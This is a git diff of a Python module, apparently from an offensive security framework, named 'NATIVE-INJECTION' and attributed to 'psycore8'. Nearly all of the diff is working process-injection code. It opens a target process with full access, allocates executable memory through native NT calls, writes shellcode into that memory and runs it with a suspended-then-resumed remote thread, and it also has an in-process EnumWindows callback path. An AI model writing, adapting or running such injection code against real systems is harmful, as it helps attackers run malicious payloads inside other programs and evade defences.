@@ -6,16 +6,20 @@
 ### 
 ########################################################
 
-import os
-from utils.windef import *
-from utils.winconst import *
+from ctypes import wintypes
+import subprocess
+from time import sleep
+#import os
+from utils.windef import pNtAllocateVirtualMemory, pNtWriteVirtualMemory, pNtCreateThreadEx, pNtResumeThread, WaitForSingleObject, OpenProcess, CloseHandle, VirtualAlloc, RtlMoveMemory, pEnumWindows, HANDLE, ACCESS_MASK, SIZE_T, ULONG, LPCVOID
+from utils.winconst import MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE, NT_SUCCESS, PROCESS_ALL_ACCESS, GENERIC_ALL, THREAD_CREATE_FLAGS_CREATE_SUSPENDED
 from utils.style import *
 from utils.helper import CheckFile
 
 CATEGORY    = 'inject'
 DESCRIPTION = 'NT-Injection with native windows API (experimental)'
 
-cs = ConsoleStyles()
+css = ConsoleStyles()
+cs_print = css.console_print()
 
 def register_arguments(parser):
             parser.add_argument('-i', '--input', help='Input file for process injection')
@@ -27,11 +31,12 @@ def register_arguments(parser):
 class module:
     from urllib import request
     from time import sleep
+    import ctypes
     import wmi
     import threading
 
     Author = 'psycore8'
-    Version = '0.9.0'
+    Version = '1.0.1'
     DisplayName = 'NATIVE-INJECTION'
     delay = 5
     data_size = 0
@@ -48,81 +53,82 @@ class module:
         self.target_process = process
 
     def Start_Process(self):
-        cs.console_print.note(f'Starting {self.target_process}')
-        os.system(self.target_process)
+        cs_print.note(f'Starting {self.target_process}')
+        #os.system(self.target_process)
+        subprocess.run(self.target_process)
 
     def get_proc_id(self):
         processes = self.wmi.WMI().Win32_Process(name=self.target_process)
         self.pid = processes[0].ProcessId
-        cs.console_print.ok(f'{self.target_process} process id: {self.pid}')
+        cs_print.ok(f'{self.target_process} process id: {self.pid}')
         return int(self.pid)
 
     def start_injection(self):
         if self.callback_func:
             mem = VirtualAlloc(0, len(self.shellcode), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
-            cs.console_print.note(f'Allocated memory address: 0x{mem:X}')
+            cs_print.note(f'Allocated memory address: 0x{mem:X}')
             RtlMoveMemory(mem, self.shellcode, len(self.shellcode))
             try:
-                pEnumWindows(mem, 0)
+                pEnumWindows(mem, 0) # type: ignore
             except:
-                cs.console_print.error('EnumWindows exception!')
+                cs_print.error('EnumWindows exception!')
                 return
             exit()
 
         if self.Start_Process:
             s = self.threading.Thread(target=self.Start_Process)
             s.start()
-            self.sleep(3)
+            sleep(3)
 
         process_id = self.get_proc_id()
-        base_address = ctypes.c_void_p(0)
+        base_address = self.ctypes.c_void_p(0)
         
         phandle = OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
         if phandle:
-            cs.console_print.ok('Opened a Handle to the process')
+            cs_print.ok('Opened a Handle to the process')
 
         rs = SIZE_T(len(self.shellcode))
-        rs_ptr = ctypes.byref(rs)
-        memory = pNtAllocateVirtualMemory(phandle, ctypes.byref(base_address), 0, rs_ptr, MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
+        rs_ptr = self.ctypes.byref(rs)
+        memory = pNtAllocateVirtualMemory(phandle, self.ctypes.byref(base_address), 0, rs_ptr, MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE) # type: ignore
         if memory == NT_SUCCESS:
-            cs.console_print.ok('Allocated Memory in the process')
+            cs_print.ok('Allocated Memory in the process')
         else:
             self.nt_error = memory
-            cs.console_print.error(f'Error during memory allocation for address 0x{self.nt_error:X}')
+            cs_print.error(f'Error during memory allocation for address 0x{self.nt_error:X}')
             return
 
         bs = len(self.shellcode)
-        writing = pNtWriteVirtualMemory(phandle, base_address, self.shellcode, bs, None)
+        writing = pNtWriteVirtualMemory(phandle, base_address, self.shellcode, bs, None) # type: ignore
         if writing == NT_SUCCESS:
-            cs.console_print.ok('Wrote The shellcode to memory')
+            cs_print.ok('Wrote The shellcode to memory')
         else:
             self.nt_error = memory
-            cs.console_print.error(f'Error during memory writing to address 0x{self.nt_error:X}')
+            cs_print.error(f'Error during memory writing to address 0x{self.nt_error:X}')
             return
         th = HANDLE()
-        Injection = pNtCreateThreadEx(ctypes.byref(th), ACCESS_MASK(GENERIC_ALL), None, phandle, base_address, None, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, 0, 0, 0, None)
+        Injection = pNtCreateThreadEx(self.ctypes.byref(th), ACCESS_MASK(GENERIC_ALL), None, phandle, base_address, None, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, 0, 0, 0, None)  # type: ignore
 
         if Injection == NT_SUCCESS :
-            cs.console_print.ok('Injected the shellcode into the process')
+            cs_print.ok('Injected the shellcode into the process')
         else:
             self.nt_error = memory
-            cs.console_print.error(f'Error during thread creation at address 0x{self.nt_error:X}')
+            cs_print.error(f'Error during thread creation at address 0x{self.nt_error:X}')
             return
 
-        cs.console_print.note('Thread suspended, waiting 10 seconds...')
-        self.sleep(1)
+        cs_print.note('Thread suspended, waiting 10 seconds...')
+        sleep(1)
 
         suspend_count = ULONG(0)
-        resume = pNtResumeThread(th, ctypes.byref(suspend_count))
+        resume = pNtResumeThread(th, self.ctypes.byref(suspend_count))  # type: ignore
         WaitForSingleObject(th, -1)
 
         if resume == NT_SUCCESS:
-            cs.console_print.ok('Injection successful')
+            cs_print.ok('Injection successful')
         else:
-            cs.console_print.error('Injection failed')
+            cs_print.error('Injection failed')
         CloseHandle(phandle)
 
-    def proc_inject():
+    def proc_inject(self):
         return False
     
     def open_file(self):
@@ -136,14 +142,14 @@ class module:
                 return False
     
     def process(self):
-        cs.module_header(self.DisplayName, self.Version)
+        css.module_header(self.DisplayName, self.Version)
         if not self.relay_input:
-            cs.console_print.note('Open file...')
+            cs_print.note('Open file...')
             if CheckFile(self.input_file):
-                cs.action_open_file2(self.input_file)
+                css.action_open_file2(self.input_file)
             else:
-                cs.console_print.error(f'File {self.input_file} not found or cannot be opened.')
+                cs_print.error(f'File {self.input_file} not found or cannot be opened.')
         self.open_file()
-        cs.console_print.note('Try to execute shellcode')
+        cs_print.note('Try to execute shellcode')
         self.start_injection()
-        cs.console_print.ok('DONE!')
+        cs_print.ok('DONE!')
